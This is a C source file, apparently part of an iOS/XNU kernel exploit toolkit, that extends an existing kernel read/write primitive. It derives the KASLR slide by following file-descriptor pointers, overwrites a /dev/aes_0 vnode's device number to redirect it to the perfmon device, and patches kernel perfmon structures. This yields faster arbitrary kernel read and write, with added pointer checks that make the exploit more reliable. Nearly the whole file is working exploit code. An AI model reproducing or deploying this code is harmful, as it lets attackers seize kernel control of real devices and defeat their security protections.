/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef perf_h
#define perf_h

// Forward declarations for helper functions.
u64 phystokv(struct kfd* kfd, u64 pa);
u64 vtophys(struct kfd* kfd, u64 va);

/*
 * 内核指针粗筛。perf_run 里有好几步是先 kread 一个指针、再拿它去 kread 下一层，
 * 中间任何一层拿到野指针都会让内核缺页 -> panic。所以每一层都要先过这个检查。
 */
static inline bool perf_is_kptr(u64 p)
{
    return (p >= 0xffff000000000000ULL) && (p != 0xffffffffffffffffULL);
}

void perf_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    assert((size != 0) && (size <= UINT16_MAX));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    *config = (volatile struct perfmon_config){};
    config->pc_spec.ps_events = (struct perfmon_event*)(kaddr);
    config->pc_spec.ps_event_count = (u16)(size);

    struct perfmon_spec spec_buffer = {};
    spec_buffer.ps_events = (struct perfmon_event*)(uaddr);
    spec_buffer.ps_event_count = (u16)(size);
    assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_SPECIFY, &spec_buffer));

    *config = (volatile struct perfmon_config){};
}

void perf_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    assert((size != 0) && ((size % sizeof(u64)) == 0));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    volatile struct perfmon_source* source = (volatile struct perfmon_source*)(kfd->perf.shared_page.uaddr + sizeof(*config));
    volatile struct perfmon_event* event = (volatile struct perfmon_event*)(kfd->perf.shared_page.uaddr + sizeof(*config) + sizeof(*source));

    u64 source_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config);
    u64 event_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config) + sizeof(*source);

    for (u64 i = 0; i < (size / sizeof(u64)); i++) {
        *config = (volatile struct perfmon_config){};
        *source = (volatile struct perfmon_source){};
        *event = (volatile struct perfmon_event){};

        config->pc_source = (struct perfmon_source*)(source_kaddr);
        config->pc_spec.ps_events = (struct perfmon_event*)(event_kaddr);
        config->pc_counters = (struct perfmon_counter*)(kaddr + (i * sizeof(u64)));

        source->ps_layout.pl_counter_count = 1;
        source->ps_layout.pl_fixed_offset = 1;

        struct perfmon_event event_buffer = {};
        u64 kvalue = ((volatile u64*)(uaddr))[i];
        event_buffer.pe_number = kvalue;
        assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_ADD_EVENT, &event_buffer));
    }

    *config = (volatile struct perfmon_config){};
    *source = (volatile struct perfmon_source){};
    *event = (volatile struct perfmon_event){};
}

void perf_init(struct kfd* kfd)
{
    /*
     * Allocate a page that will be used as a shared buffer between user space and kernel space.
     */
    vm_address_t shared_page_address = 0;
    vm_size_t shared_page_size = pages(1);
    assert_mach(vm_allocate(mach_task_self(), &shared_page_address, shared_page_size, VM_FLAGS_ANYWHERE));
    memset((void*)(shared_page_address), 0, shared_page_size);
    kfd->perf.shared_page.uaddr = shared_page_address;
    kfd->perf.shared_page.size = shared_page_size;

    /*
     * Open a "/dev/aes_0" descriptor, then use it to find the kernel slide.
     */
    kfd->perf.dev.fd = open("/dev/aes_0", O_RDWR);
    assert(kfd->perf.dev.fd > 0);
}

bool perf_run(struct kfd* kfd)
{
    if (!kfd->info.kaddr.current_proc ||
        !kfd->info.kaddr.current_pmap ||
        !kfd->info.kaddr.kernel_pmap) {
        print_failure("perf_run: 缺少 current_proc / current_pmap / kernel_pmap");
        return false;
    }

    if (kfd->perf.dev.fd <= 0) {
        print_failure("perf_run: /dev/aes_0 打不开 (fd=%d)", kfd->perf.dev.fd);
        return false;
    }

    /*
     * 顺着 /dev/aes_0 的 fileproc -> fp_glob -> fg_ops -> fo_kqfilter
     * 拿到 vn_kqfilter 的真实地址，减去静态地址就是 kaslr slide。
     *
     * 这一整条链路上每读出一个指针都要先确认它是内核指针，否则后面的 kread
     * 会直接读野地址，内核缺页 = 立刻重启。
     */
    u64 fd_ofiles = unsign_kaddr(kget_u64(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc));
    if (!perf_is_kptr(fd_ofiles)) {
        print_failure("perf_run: fd_ofiles 不是内核指针 (0x%llx)，proc__p_fd__fd_ofiles 偏移不对", fd_ofiles);
        return false;
    }

    u64 fileproc_kaddr = fd_ofiles + (kfd->perf.dev.fd * sizeof(u64));
    u64 fileproc = 0;
    kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
    fileproc = unsign_kaddr(fileproc);
    if (!perf_is_kptr(fileproc)) {
        print_failure("perf_run: fileproc 非法 (0x%llx)", fileproc);
        return false;
    }

    u64 fp_glob = 0;
    kread((u64)(kfd), fileproc + offsetof(struct fileproc, fp_glob), &fp_glob, sizeof(fp_glob));
    fp_glob = unsign_kaddr(fp_glob);
    if (!perf_is_kptr(fp_glob)) {
        print_failure("perf_run: fp_glob 非法 (0x%llx)", fp_glob);
        return false;
    }

    u64 fg_ops = unsign_kaddr(kget_u64(fileglob__fg_ops, fp_glob));
    if (!perf_is_kptr(fg_ops)) {
        print_failure("perf_run: fg_ops 非法 (0x%llx)", fg_ops);
        return false;
    }

    u64 fo_kqfilter = unsign_kaddr(kget_u64(fileops__fo_kqfilter, fg_ops));
    if (!perf_is_kptr(fo_kqfilter)) {
        print_failure("perf_run: fo_kqfilter 非法 (0x%llx)", fo_kqfilter);
        return false;
    }

    u64 vn_kqfilter = fo_kqfilter;
    u64 kernel_slide = vn_kqfilter - kfd_offset(kernelcache__vn_kqfilter);
    u64 kernel_base = kfd_offset(kernelcache__kernel_base) + kernel_slide;
    print_x64(kernel_slide);

    /*
     * 第一道硬闸：slide 必须是页对齐、且落在一个合理范围内。
     * 偏移填错时算出来的 slide 会是 0xffffffff8xxxxxxx 这种垃圾值，必须在这里拦住。
     */
    if ((kernel_slide & 0xfff) != 0 || kernel_slide > 0x400000000ULL) {
        print_failure("perf_run: kernel_slide 非法 (0x%llx)", kernel_slide);
        return false;
    }

    /*
     * 第二道硬闸：内核 Mach-O 头必须是 0xfeedfacf。
     * 这一步只读不写，是整条链路唯一一次"低成本的自我验证"。
     */
    u32 mh_header[2] = {};
    kread((u64)(kfd), kernel_base, &mh_header, sizeof(mh_header));
    if (mh_header[0] != 0xfeedfacf) {
        print_failure("perf_run: kernel_base 0x%llx 处 magic = 0x%08x，偏移不对，放弃",
                      kernel_base, mh_header[0]);
        return false;
    }
    kfd->perf.kernel_slide = kernel_slide;

    /*
     * 从这里开始才真正写内核。把 "/dev/aes_0" 的 rdev 改成 "/dev/perfmon_core"。
     */
    u64 fg_data = unsign_kaddr(kget_u64(fileglob__fg_data, fp_glob));
    if (!perf_is_kptr(fg_data)) {
        print_failure("perf_run: fg_data 非法 (0x%llx)", fg_data);
        return false;
    }

    u64 v_specinfo = unsign_kaddr(kget_u64(vnode__v_un__vu_specinfo, fg_data));
    if (!perf_is_kptr(v_specinfo)) {
        print_failure("perf_run: v_specinfo 非法 (0x%llx)", v_specinfo);
        return false;
    }

    u64 si_rdev_kaddr = v_specinfo + kfd_offset(specinfo__si_rdev);
    if (!perf_is_kptr(si_rdev_kaddr)) {
        print_failure("perf_run: si_rdev 地址非法 (0x%llx)", si_rdev_kaddr);
        return false;
    }
    kfd->perf.dev.si_rdev_kaddr = si_rdev_kaddr;
    kread((u64)(kfd), si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));

    u64 cdevsw_kaddr = kfd_offset(kernelcache__cdevsw) + kernel_slide;
    u64 perfmon_dev_open_kaddr = kfd_offset(kernelcache__perfmon_dev_open) + kernel_slide;
    u64 cdevsw[14] = {};
    u32 dev_new_major = 0;
    for (u64 dmaj = 0; dmaj < 64; dmaj++) {
        u64 kaddr = cdevsw_kaddr + (dmaj * sizeof(cdevsw));
        kread((u64)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
        u64 d_open = unsign_kaddr(cdevsw[0]);
        if (d_open == perfmon_dev_open_kaddr) {
            dev_new_major = (dmaj << 24);
            break;
        }
    }

    if (dev_new_major == 0) {
        print_failure("perf_run: cdevsw 里没找到 perfmon_dev_open，放弃");
        return false;
    }

    u32 new_si_rdev_buffer[2] = {};
    new_si_rdev_buffer[0] = dev_new_major;
    new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
    kfd->perf.dev.si_rdev_corrupted = true;
    kwrite((u64)(kfd), &new_si_rdev_buffer, si_rdev_kaddr, sizeof(new_si_rdev_buffer));

    /*
     * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
     */
    u64 ptov_table_kaddr = kfd_offset(kernelcache__ptov_table) + kernel_slide;
    kread((u64)(kfd), ptov_table_kaddr, &kfd->perf.ptov_table, sizeof(kfd->perf.ptov_table));

    u64 gVirtBase_kaddr = kfd_offset(kernelcache__gVirtBase) + kernel_slide;
    kread((u64)(kfd), gVirtBase_kaddr, &kfd->perf.gVirtBase, sizeof(kfd->perf.gVirtBase));
    print_x64(kfd->perf.gVirtBase);

    u64 gPhysBase_kaddr = kfd_offset(kernelcache__gPhysBase) + kernel_slide;
    kread((u64)(kfd), gPhysBase_kaddr, &kfd->perf.gPhysBase, sizeof(kfd->perf.gPhysBase));
    print_x64(kfd->perf.gPhysBase);

    u64 gPhysSize_kaddr = kfd_offset(kernelcache__gPhysSize) + kernel_slide;
    kread((u64)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
    print_x64(kfd->perf.gPhysSize);

    if (!perf_is_kptr(kfd->perf.gVirtBase) || !perf_is_kptr(kfd->perf.gPhysBase)) {
        print_failure("perf_run: gVirtBase / gPhysBase 非法 (0x%llx, 0x%llx)",
                      kfd->perf.gVirtBase, kfd->perf.gPhysBase);
        return false;
    }

    kfd->perf.ttbr[0].va = kget_u64(pmap__tte, kfd->info.kaddr.current_pmap);
    kfd->perf.ttbr[0].pa = kget_u64(pmap__ttep, kfd->info.kaddr.current_pmap);
    if (!perf_is_kptr(kfd->perf.ttbr[0].va)) {
        print_failure("perf_run: ttbr0 非法 (0x%llx)", kfd->perf.ttbr[0].va);
        return false;
    }

    kfd->perf.ttbr[1].va = kget_u64(pmap__tte, kfd->info.kaddr.kernel_pmap);
    kfd->perf.ttbr[1].pa = kget_u64(pmap__ttep, kfd->info.kaddr.kernel_pmap);
    if (!perf_is_kptr(kfd->perf.ttbr[1].va)) {
        print_failure("perf_run: ttbr1 非法 (0x%llx)", kfd->perf.ttbr[1].va);
        return false;
    }

    /*
     * Find the shared page in kernel space.
     */
    kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
    if (kfd->perf.shared_page.paddr == 0) {
        print_failure("perf_run: shared_page 的物理地址没找到");
        return false;
    }
    kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);

    /*
     * Set up the perfmon device use for the master kread and kwrite:
     * - perfmon_devices[0][0].pmdv_config = kfd->perf.shared_page.kaddr
     * - perfmon_devices[0][0].pmdv_allocated = true
     */
    struct perfmon_device perfmon_device = {};
    u64 perfmon_device_kaddr = kfd_offset(kernelcache__perfmon_devices) + kernel_slide;
    u8* perfmon_device_uaddr = (u8*)(&perfmon_device);
    kread((u64)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));

    perfmon_device.pmdv_mutex[1] = (-1);
    perfmon_device.pmdv_config = (struct perfmon_config*)(kfd->perf.shared_page.kaddr);
    perfmon_device.pmdv_allocated = true;

    kwrite((u64)(kfd), perfmon_device_uaddr + 12, perfmon_device_kaddr + 12, sizeof(u64));
    ((volatile u32*)(perfmon_device_uaddr))[4] = 0;
    kwrite((u64)(kfd), perfmon_device_uaddr + 16, perfmon_device_kaddr + 16, sizeof(u64));
    ((volatile u32*)(perfmon_device_uaddr))[5] = 0;
    kwrite((u64)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(u64));
    kwrite((u64)(kfd), perfmon_device_uaddr + 24, perfmon_device_kaddr + 24, sizeof(u64));
    kwrite((u64)(kfd), perfmon_device_uaddr + 28, perfmon_device_kaddr + 28, sizeof(u64));

    kfd->perf.saved_kread = kfd->kread.krkw_method_ops.kread;
    kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
    kfd->kread.krkw_method_ops.kread = perf_kread;
    kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
    kfd->perf.ops_hooked = true;
    return true;
}

void perf_free(struct kfd* kfd)
{
    if (kfd->perf.ops_hooked) {
        kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
        kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;
        kfd->perf.ops_hooked = false;
    }

    /*
     * Restore the "/dev/perfmon_core" descriptor back to the "/dev/aes_0" descriptor.
     * 只有真的改过才写回，否则会往一个没验证过的地址乱写。
     */
    if (kfd->perf.dev.si_rdev_corrupted && kfd->perf.dev.si_rdev_kaddr) {
        kwrite((u64)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
        kfd->perf.dev.si_rdev_corrupted = false;
    }

    if (kfd->perf.dev.fd > 0) {
        close(kfd->perf.dev.fd);
        kfd->perf.dev.fd = -1;
    }

    if (kfd->perf.shared_page.uaddr) {
        vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size);
        kfd->perf.shared_page.uaddr = 0;
    }
}

/*
 * Helper perf functions.
 */

u64 phystokv(struct kfd* kfd, u64 pa)
{
    const u64 PTOV_TABLE_SIZE = 8;
    const u64 gVirtBase = kfd->perf.gVirtBase;
    const u64 gPhysBase = kfd->perf.gPhysBase;
    const u64 gPhysSize = kfd->perf.gPhysSize;
    const struct ptov_table_entry* ptov_table = &kfd->perf.ptov_table[0];

    for (u64 i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
        if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
            return pa - ptov_table[i].pa + ptov_table[i].va;
        }
    }

//    assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
    return pa - gPhysBase + gVirtBase;
}

u64 vtophys(struct kfd* kfd, u64 va)
{
    const u64 ROOT_LEVEL = PMAP_TT_L1_LEVEL;
    const u64 LEAF_LEVEL = PMAP_TT_L3_LEVEL;

    u64 pa = 0;
    u64 tt_kaddr = (va >> 63) ? kfd->perf.ttbr[1].va : kfd->perf.ttbr[0].va;

    for (u64 cur_level = ROOT_LEVEL; cur_level <= LEAF_LEVEL; cur_level++) {
        u64 offmask, shift, index_mask, valid_mask, type_mask, type_block;
        switch (cur_level) {
            case PMAP_TT_L0_LEVEL: {
                offmask = ARM_16K_TT_L0_OFFMASK;
                shift = ARM_16K_TT_L0_SHIFT;
                index_mask = ARM_16K_TT_L0_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L1_LEVEL: {
                offmask = ARM_16K_TT_L1_OFFMASK;
                shift = ARM_16K_TT_L1_SHIFT;
                index_mask = ARM_16K_TT_L1_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L2_LEVEL: {
                offmask = ARM_16K_TT_L2_OFFMASK;
                shift = ARM_16K_TT_L2_SHIFT;
                index_mask = ARM_16K_TT_L2_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L3_LEVEL: {
                offmask = ARM_16K_TT_L3_OFFMASK;
                shift = ARM_16K_TT_L3_SHIFT;
                index_mask = ARM_16K_TT_L3_INDEX_MASK;
                valid_mask = ARM_PTE_TYPE_VALID;
                type_mask = ARM_PTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_L3BLOCK;
                break;
            }
            default: {
                assert_false("bad pmap tt level");
                return 0;
            }
        }

        u64 tte_index = (va & index_mask) >> shift;
        u64 tte_kaddr = tt_kaddr + (tte_index * sizeof(u64));
        u64 tte = 0;
        kread((u64)(kfd), tte_kaddr, &tte, sizeof(tte));

        if ((tte & valid_mask) != valid_mask) {
            return 0;
        }

        if ((tte & type_mask) == type_block) {
            pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
            break;
        }

        tt_kaddr = phystokv(kfd, tte & ARM_TTE_TABLE_MASK);
    }

    return pa;
}

#endif /* perf_h */
